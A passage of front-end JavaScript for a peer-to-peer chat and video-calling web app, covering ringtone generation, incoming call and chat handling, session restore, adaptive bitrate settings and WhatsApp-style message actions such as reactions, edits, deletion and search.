    peer.on('connection', handleIncomingCyberConnection);
}

// Web Audio API Ringtone Generator (Classic Phone Ring)
let ringtoneInterval = null;
let ringtoneAudioCtx = null;

function playRingtone() {
    try {
        if (ringtoneAudioCtx) return;
        ringtoneAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        function ring() {
            if (!ringtoneAudioCtx) return;
            const osc1 = ringtoneAudioCtx.createOscillator();
            const osc2 = ringtoneAudioCtx.createOscillator();
            const gain = ringtoneAudioCtx.createGain();
            
            osc1.type = 'sine';
            osc2.type = 'sine';
            
            osc1.frequency.setValueAtTime(440, ringtoneAudioCtx.currentTime);
            osc2.frequency.setValueAtTime(480, ringtoneAudioCtx.currentTime);
            
            osc1.connect(gain);
            osc2.connect(gain);
            gain.connect(ringtoneAudioCtx.destination);
            
            gain.gain.setValueAtTime(0, ringtoneAudioCtx.currentTime);
            gain.gain.linearRampToValueAtTime(0.12, ringtoneAudioCtx.currentTime + 0.1);
            gain.gain.linearRampToValueAtTime(0.12, ringtoneAudioCtx.currentTime + 1.2);
            gain.gain.linearRampToValueAtTime(0, ringtoneAudioCtx.currentTime + 1.4);
            
            osc1.start();
            osc2.start();
            
            setTimeout(() => {
                try {
                    osc1.stop();
                    osc2.stop();
                } catch(e){}
            }, 1500);
        }
        
        ring();
        ringtoneInterval = setInterval(ring, 3000);
    } catch (e) {}
}

function stopRingtone() {
    if (ringtoneInterval) {
        clearInterval(ringtoneInterval);
        ringtoneInterval = null;
    }
    if (ringtoneAudioCtx) {
        ringtoneAudioCtx.close().catch(() => {});
        ringtoneAudioCtx = null;
    }
}

function handleIncomingCyberCall(call) {
    console.log('📞 Incoming call from:', call.peer);
    playSciFiSound('join');
    playRingtone();

    const modal = document.getElementById('incomingCallModal');
    const textEl = document.getElementById('incomingCallText');
    const acceptBtn = document.getElementById('acceptCallBtn');
    const declineBtn = document.getElementById('declineCallBtn');

    textEl.textContent = `@${call.peer} is calling you...`;
    modal.classList.remove('hidden');

    const cleanAccept = acceptBtn.cloneNode(true);
    const cleanDecline = declineBtn.cloneNode(true);
    acceptBtn.parentNode.replaceChild(cleanAccept, acceptBtn);
    declineBtn.parentNode.replaceChild(cleanDecline, declineBtn);

    cleanAccept.addEventListener('click', async () => {
        stopRingtone();
        modal.classList.add('hidden');
        recordCallHistory(call.peer, 'incoming', currentCallMode, 'answered');
        showPage(roomPage);
        roomIdDisplay.textContent = "DIRECT CALL";
        
        // Set professional Room ID and Role for Telegram Logging
        currentRoomId = call.peer + '_to_' + currentUser.username;
        userRole = 'joiner';

        localStream = await getMediaStream(currentCallMode);
        if (!localStream) { showToast('No media access'); return; }
        
        if (currentCallMode === 'video') {
            localVideo.srcObject = localStream;
            document.getElementById('audioCallOverlay').classList.add('hidden');
        } else {
            document.getElementById('audioCallOverlay').classList.remove('hidden');
            document.getElementById('audioCallName').textContent = '@' + call.peer;
        }

        call.answer(localStream);

        call.on('stream', (rs) => {
            console.log('Remote stream received!');
            showCallScreen(rs);
        });
        call.on('close', () => { showToast('Call ended'); leaveRoom(); });
        call.on('error', (err) => console.error('Call error:', err));
        currentCall = call;
    });

    cleanDecline.addEventListener('click', () => {
        stopRingtone();
        modal.classList.add('hidden');
        recordCallHistory(call.peer, 'incoming', currentCallMode, 'missed');
        call.close();
        showToast('Call declined');
    });
}

function handleIncomingCyberConnection(conn) {
    console.log('💬 Direct chat connection from:', conn.peer);
    dataConnection = conn;
    activeChatUsername = conn.peer;
    activeChatDisplayName = '@' + conn.peer;
    conn.on('open', () => {
        updateChatHeader('online • peer-to-peer connected');
        showToast(`💬 @${conn.peer} opened a chat with you!`);
    });
    conn.on('data', handleDataMessage);
    conn.on('close', () => { updateChatHeader('offline'); console.log('Data connection closed'); });
}

function createTypingIndicator() {
    const div = document.createElement('div');
    div.id = 'typingIndicator';
    div.style.cssText = 'display:none; padding:6px 14px; font-size:0.8rem; color:#8696a0;';
    div.innerHTML = `<i class="fas fa-ellipsis-h"></i> typing...`;
    chatMessages.appendChild(div);
    return div;
}

// Check session on load
function checkCyberSession() {
    try {
        const stored = localStorage.getItem('cyberUser');
        if (stored) {
            currentUser = JSON.parse(stored);
            
            // Show Dashboards, Hide Onboardings
            document.getElementById('chatsLoggedOutCard').classList.add('hidden');
            document.getElementById('chatsLoggedInDashboard').classList.remove('hidden');
            document.getElementById('callsLoggedOutCard').classList.add('hidden');
            document.getElementById('callsLoggedInDashboard').classList.remove('hidden');
            document.getElementById('appFab').classList.remove('hidden');

            document.getElementById('cyberAuthBox').classList.add('hidden');
            document.getElementById('cyberDashboardBox').classList.remove('hidden');
            document.getElementById('cyberProfileName').textContent = currentUser.display_name;
            document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;

            loadUnreadCounts();

            // Start background heartbeats & friends polling
            sendHeartbeat();
            if (cyberHeartbeatInterval) clearInterval(cyberHeartbeatInterval);
            cyberHeartbeatInterval = setInterval(sendHeartbeat, 15000);
            
            pollFriendsList();
            if (cyberFriendsInterval) clearInterval(cyberFriendsInterval);
            cyberFriendsInterval = setInterval(pollFriendsList, 10000);

            // ONLY connect the Cyber Peer if we are NOT currently in an anonymous room!
            const params = new URLSearchParams(window.location.search);
            if (!params.get('room')) {
                initCyberPeer();
            }
        } else {
            switchAppTab('profile'); // Focus on Login if not logged in
        }
    } catch (err) {
        console.error("Session load error:", err);
        localStorage.removeItem('cyberUser');
        switchAppTab('profile');
    }
}

// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
function setupDynamicNetworkAdaptation(call) {
    if (!call || !call.peerConnection) return;
    try {
        const pc = call.peerConnection;
        const senders = pc.getSenders();
        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
        if (videoSender && videoSender.getParameters) {
            const params = videoSender.getParameters();
            if (!params.encodings) params.encodings = [{}];
            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
            params.encodings[0].networkPriority = 'high';
            videoSender.setParameters(params).catch(() => {});
        }

        // Set degradation preference to maintain maximum resolution on slow networks!
        if (pc.getTransceivers) {
            pc.getTransceivers().forEach(transceiver => {
                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
                }
            });
        }

        const pingEl = document.getElementById('pingText');
        const netInterval = setInterval(async () => {
            if (!isCallActive || !pc || pc.connectionState === 'closed') {
                clearInterval(netInterval);
                return;
            }
            try {
                const stats = await pc.getStats();
                let rtt = 0, width = 0, height = 0;
                stats.forEach(report => {
                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                        rtt = Math.round(report.currentRoundTripTime * 1000);
                    }
                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                        if (report.frameWidth) width = report.frameWidth;
                        if (report.frameHeight) height = report.frameHeight;
                    }
                });
                if (pingEl && rtt > 0) {
                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
                    if (rtt < 80) {
                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
                    } else if (rtt < 180) {
                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                    } else {
                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
                    }
                }
            } catch (e) {}
        }, 2500);
    } catch (e) {}
}

function updateControlButtons() {
    if (toggleMicBtn) {
        toggleMicBtn.className = 'ctrl-btn' + (isMicOn ? ' ctrl-btn-active' : '');
        toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
    }
    if (toggleCamBtn) {
        toggleCamBtn.className = 'ctrl-btn' + (isCamOn ? ' ctrl-btn-active' : '');
        toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
    }
    if (toggleScreenBtn) {
        toggleScreenBtn.className = 'ctrl-btn' + (isScreenSharing ? ' ctrl-btn-active' : '');
    }
}

// ============ INIT ============
checkUrlForRoom();
checkFilePreview();
checkCyberSession();

// ============ WhatsApp Pro Pack: message menu, emoji, attachment, search, media preview ============
function getMessageTextForAction(el) {
    return (el.querySelector('.msg-text') || el.querySelector('.file-name') || el.querySelector('.voice-duration') || {}).textContent || 'Media message';
}
function applyMessageReaction(id, emoji) {
    const el = chatMessages && chatMessages.querySelector(`[data-message-id="${id}"]`);
    if (!el) return;
    let r = el.querySelector('.message-reaction');
    if (!r) { r = document.createElement('span'); r.className = 'message-reaction'; el.appendChild(r); }
    r.textContent = emoji;
}
function applyMessageEdit(id, text) {
    const el = chatMessages && chatMessages.querySelector(`[data-message-id="${id}"]`);
    if (!el) return;
    const t = el.querySelector('.msg-text');
    if (t) t.textContent = text;
    el.classList.add('edited-message');
    if (!el.querySelector('.edited-label')) {
        const label = document.createElement('span'); label.className = 'edited-label'; label.textContent = ' edited';
        const meta = el.querySelector('.msg-meta'); if (meta) meta.prepend(label);
    }
}
function applyMessageDelete(id) {
    const el = chatMessages && chatMessages.querySelector(`[data-message-id="${id}"]`);
    if (!el) return;
    el.classList.add('deleted-message');
    el.innerHTML = '<span class="msg-text"><i class="fas fa-ban"></i> This message was deleted</span><div class="msg-meta"><span>' + new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + '</span></div>';
}
function showMessageActionMenu(messageEl, x, y) {
    if (!messageEl || !messageEl.classList.contains('chat-msg')) return;
    const old = document.getElementById('msgActionMenu'); if (old) old.remove();
    const id = messageEl.getAttribute('data-message-id');
    const isSent = messageEl.classList.contains('sent');
    const canEdit = isSent && id && messageEl.querySelector('.msg-text') && !messageEl.classList.contains('deleted-message');
    const menu = document.createElement('div');
    menu.id = 'msgActionMenu';
    menu.className = 'msg-action-menu';
    menu.style.left = Math.min(x, window.innerWidth - 210) + 'px';
    menu.style.top = Math.min(y, window.innerHeight - 260) + 'px';
    menu.innerHTML = `
        <button data-act="reply"><i class="fas fa-reply"></i> Reply</button>
        <button data-act="react"><i class="far fa-smile"></i> React</button>
        ${canEdit ? '<button data-act="edit"><i class="fas fa-pen"></i> Edit</button>' : ''}
        <button data-act="copy"><i class="fas fa-copy"></i> Copy</button>
        <button data-act="delete-me"><i class="fas fa-trash"></i> Delete for me</button>
        ${id ? '<button data-act="delete-all"><i class="fas fa-trash-alt"></i> Delete for everyone</button>' : ''}
    `;
    document.body.appendChild(menu);
    menu.addEventListener('click', (e) => {
        const btn = e.target.closest('button'); if (!btn) return;
        const act = btn.dataset.act;
        if (act === 'reply') setReplyMode(messageEl);
        if (act === 'copy') navigator.clipboard && navigator.clipboard.writeText(getMessageTextForAction(messageEl));
        if (act === 'react') showReactionPicker(messageEl, menu.getBoundingClientRect().left, menu.getBoundingClientRect().bottom);
        if (act === 'edit') {
            const oldText = getMessageTextForAction(messageEl);
            const nt = prompt('Edit message:', oldText);
            if (nt && nt.trim() && id) {
                applyMessageEdit(id, nt.trim());
                if (dataConnection && dataConnection.open) dataConnection.send({ type:'edit-message', id, text: nt.trim(), from: currentUser ? currentUser.username : userRole });
            }
        }
        if (act === 'delete-me') messageEl.remove();
        if (act === 'delete-all' && id && confirm('Delete for everyone?')) {
            applyMessageDelete(id);
            if (dataConnection && dataConnection.open) dataConnection.send({ type:'delete-message', id, from: currentUser ? currentUser.username : userRole });
        }
        if (act !== 'react') menu.remove();
    });
    setTimeout(() => document.addEventListener('click', function close(ev){ if (!menu.contains(ev.target)) { menu.remove(); document.removeEventListener('click', close); } }), 0);
}
function showReactionPicker(messageEl, x, y) {
    const old = document.getElementById('reactionPicker'); if (old) old.remove();
    const id = messageEl.getAttribute('data-message-id');
    const picker = document.createElement('div');
    picker.id = 'reactionPicker'; picker.className = 'reaction-picker'; picker.style.left = x + 'px'; picker.style.top = y + 'px';
    ['❤️','😂','👍','🔥','😮','😢'].forEach(em => {
        const b = document.createElement('button'); b.textContent = em; b.onclick = () => {
            if (id) {
                applyMessageReaction(id, em);
                if (dataConnection && dataConnection.open) dataConnection.send({ type:'reaction-message', id, emoji: em, from: currentUser ? currentUser.username : userRole });
            }
            picker.remove(); const m = document.getElementById('msgActionMenu'); if (m) m.remove();
        };
        picker.appendChild(b);
    });
    document.body.appendChild(picker);
}
function initMessageGestures() {
    if (!chatMessages || chatMessages.dataset.gesturesReady) return;
    chatMessages.dataset.gesturesReady = '1';
    let pressTimer = null;
    chatMessages.addEventListener('contextmenu', e => {
        const msg = e.target.closest('.chat-msg'); if (!msg) return;
        e.preventDefault(); showMessageActionMenu(msg, e.clientX, e.clientY);
    });
    chatMessages.addEventListener('touchstart', e => {
        const msg = e.target.closest('.chat-msg'); if (!msg) return;
        pressTimer = setTimeout(() => showMessageActionMenu(msg, e.touches[0].clientX, e.touches[0].clientY), 550);
    }, {passive:true});
    ['touchend','touchmove','touchcancel'].forEach(ev => chatMessages.addEventListener(ev, () => clearTimeout(pressTimer), {passive:true}));
}
function initEmojiAndAttachmentMenus() {
    const emojiBtn = document.querySelector('.composer-pill .composer-icon[title="Emoji"]');
    if (emojiBtn && !emojiBtn.dataset.ready) {
        emojiBtn.dataset.ready = '1';
        emojiBtn.onclick = () => {
            let p = document.getElementById('emojiPickerPanel');
            if (p) { p.remove(); return; }
            p = document.createElement('div'); p.id = 'emojiPickerPanel'; p.className = 'emoji-picker-panel';
            '😀 😃 😂 🤣 😊 😍 😘 😎 😢 😭 😡 👍 👎 ❤️ 🔥 🎉 🙏 💯'.split(' ').forEach(em => {
                const b = document.createElement('button'); b.textContent = em; b.onclick = () => { chatInput.value += em; updateChatComposer(); chatInput.focus(); };
                p.appendChild(b);
            });
            whatsappComposer.parentNode.insertBefore(p, whatsappComposer);
        };
    }
    if (attachFileBtn && !attachFileBtn.dataset.menuReady) {
        attachFileBtn.dataset.menuReady = '1';
    }
}
function initChatSearchButton() {
    const actions = document.querySelector('.chat-header-actions');
    if (!actions || document.getElementById('chatSearchBtn')) return;
    const btn = document.createElement('button'); btn.id = 'chatSearchBtn'; btn.className = 'chat-head-btn'; btn.title = 'Search chat'; btn.innerHTML = '<i class="fas fa-search"></i>';
    actions.insertBefore(btn, actions.firstChild);
    btn.onclick = () => {
        let bar = document.getElementById('chatSearchBar');
        if (bar) { bar.remove(); document.querySelectorAll('.chat-msg').forEach(m => m.style.display = ''); return; }
        bar = document.createElement('div'); bar.id = 'chatSearchBar'; bar.className = 'chat-search-bar';
        bar.innerHTML = '<i class="fas fa-search"></i><input placeholder="Search messages"/><button><i class="fas fa-times"></i></button>';
        chatMessages.parentNode.insertBefore(bar, chatMessages);
        const input = bar.querySelector('input');
        input.oninput = () => {
            const q = input.value.toLowerCase();
            document.querySelectorAll('.chat-msg').forEach(m => { m.style.display = !q || m.textContent.toLowerCase().includes(q) ? '' : 'none'; });
        };
        bar.querySelector('button').onclick = () => { bar.remove(); document.querySelectorAll('.chat-msg').forEach(m => m.style.display = ''); };
        input.focus();
    };
}
function openMediaPreview(src, type, name='media') {
    let o = document.getElementById('mediaPreviewOverlay'); if (o) o.remove();
    o = document.createElement('div'); o.id = 'mediaPreviewOverlay'; o.className = 'media-preview-overlay';
    o.innerHTML = `<div class="media-preview-top"><span>${name}</span><button><i class="fas fa-times"></i></button></div><div class="media-preview-body">${type === 'video' ? `<video src="${src}" controls autoplay playsinline></video>` : `<img src="${src}" alt="${name}">`}</div>`;
    o.querySelector('button').onclick = () => o.remove();
    document.body.appendChild(o);
}
function openChatOptions(username) {
    loadChatPrefs();
    const p = chatPrefs[username] || {};
    const choice = prompt(`Options for @${username}\n1. ${p.pinned ? 'Unpin' : 'Pin'} chat\n2. ${p.muted ? 'Unmute' : 'Mute'} chat\n3. ${p.archived ? 'Unarchive' : 'Archive'} chat\n\nType 1, 2 or 3:`);
    if (!choice) return;
    chatPrefs[username] = p;
    if (choice.trim() === '1') p.pinned = !p.pinned;
    if (choice.trim() === '2') p.muted = !p.muted;
    if (choice.trim() === '3') p.archived = !p.archived;
    saveChatPrefs();
    renderFriendsList(lastFriendsCache);
    showToast(`Updated @${username}`);
}
window.openChatOptions = openChatOptions;
function initWhatsAppProPack() {
    initMessageGestures();
    initEmojiAndAttachmentMenus();
    initChatSearchButton();
    renderLocalCallHistory();
}
setTimeout(initWhatsAppProPack, 500);
